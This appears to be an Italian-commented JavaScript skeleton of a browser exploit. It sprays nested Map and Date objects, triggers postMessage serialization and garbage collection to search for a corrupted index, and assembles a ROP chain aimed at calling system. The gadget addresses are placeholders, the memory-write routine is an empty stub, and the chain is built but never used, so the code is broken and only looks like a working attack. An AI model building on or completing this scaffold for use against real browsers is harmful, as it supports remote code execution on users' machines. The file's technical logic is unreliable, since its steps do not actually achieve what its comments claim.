// Gadget per la ROP chain (esempio)
const gadgets = {
    "pop_rdi": 0xdeadbeef,  // Indirizzo del gadget pop rdi
    "pop_rsi": 0xcafebabe,  // Indirizzo del gadget pop rsi
    "pop_rdx": 0xfeedface,  // Indirizzo del gadget pop rdx
    "ret": 0x12345678,      // Indirizzo del ritorno (NOP slide o padding)
    "system": 0xdeadbeef,    // Indirizzo della funzione system
    "exit": 0xabcdef12      // Indirizzo della funzione exit
};

// Funzione per eseguire la Garbage Collection (GC)
function gc() {
    try {
        new Uint8Array(256 * 1024);  // Alloca memoria per forzare la GC
        alert('Garbage Collection eseguita');
    } catch (e) {
        alert("Errore durante Garbage Collection: " + e.message);
    }
}

// Funzione per creare una struttura di oggetti Map e Date per lo spray della memoria
function createObjectStructure(num_elems) {
    let root = new Map();
    let msg = root;
    let foo = [];

    // Riempie l'array foo con oggetti Date pi√π piccoli
    for (let i = 0; i < 5; i++) {
        foo.push(new Date(0xffff));  // Oggetti Date con valori fissi
    }

    // Crea una catena di oggetti Map
    for (let i = 0; i < num_elems; i++) {
        const d = new Date(i);
        const map = new Map();
        msg.set(d, [map, foo]);
        msg = map;
    }

    // Esegui la Garbage Collection
    gc();
    alert('Struttura di oggetti creata');
    return root;
}

// Funzione per fare un test di scrittura (RW) sulla memoria
function rwTest(address, value) {
    alert(`Test RW: Scrivo ${value} in ${address}`);
    // Qui aggiungi la logica per scrivere in una zona di memoria vulnerabile
    // Potresti sovrascrivere una funzione o indirizzo di ritorno
}

// Funzione per costruire una ROP chain
function ropChain() {
    const chain = [];

    // Aggiungi i gadget per la ROP chain
    chain.push(gadgets.pop_rdi);  // Pop RDI
    chain.push(gadgets.pop_rsi);  // Pop RSI
    chain.push(gadgets.pop_rdx);  // Pop RDX
    chain.push(gadgets.ret);      // Ritorno (NOP slide o padding)

    // Aggiungi la funzione system per eseguire comandi
    chain.push(gadgets.system);
    chain.push(gadgets.exit);     // Uscita (per terminare correttamente)

    return chain;
}

// Funzione principale che gestisce l'exploit
export async function main() {
    alert("Exploit iniziato");

    // Riduci il numero di oggetti per evitare crash
    const num_elems = 5;  
    let root = createObjectStructure(num_elems);  // Crea la struttura di oggetti
    let msg = root;
    let data2 = null;
    let idx = null;

    alert("Struttura di oggetti creata");

    let found = false;
    while (!found) {
        let data = null;
        const prom = new Promise(resolve => {
            addEventListener('message', event => {
                data = event;
                resolve();
            }, { once: true });
        });

        alert("Postando messaggio...");
        postMessage(msg, origin);  // Pubblica il messaggio
        await prom;  // Attendi che venga ricevuto il messaggio
        data = data.data;

        gc();  // Esegui la Garbage Collection per liberare memoria

        await sleep(100);  // Attendi per evitare sovraccarichi di memoria

        let i;
        try {
            // Ciclo per cercare l'indice
            alert("Inizio ricerca dell'indice...");
            for (i = 0; i < num_elems; i++) {
                if (data.keys().next().value.getTime() === 0xffff) {
                    idx = i;
                    found = true;
                    break;
                }
                data = data.values().next().value[0];
            }
        } catch (e) {
            alert("Errore durante l'elaborazione del messaggio: " + e.message);
            break;
        }
    }

    alert('Exploit attivato, prova a fare crash');
    alert('[+] idx: ' + idx);

    // Esegui la ROP chain e il test RW
    let rop = ropChain();
    rwTest(0xdeadbeef, 0x1337);  // Test RW con indirizzo fittizio
    alert("ROP chain e test RW completati");
}

// Aggiungi evento per avviare l'exploit al click del pulsante
document.getElementById('button').addEventListener('click', async () => {
    await main();
});
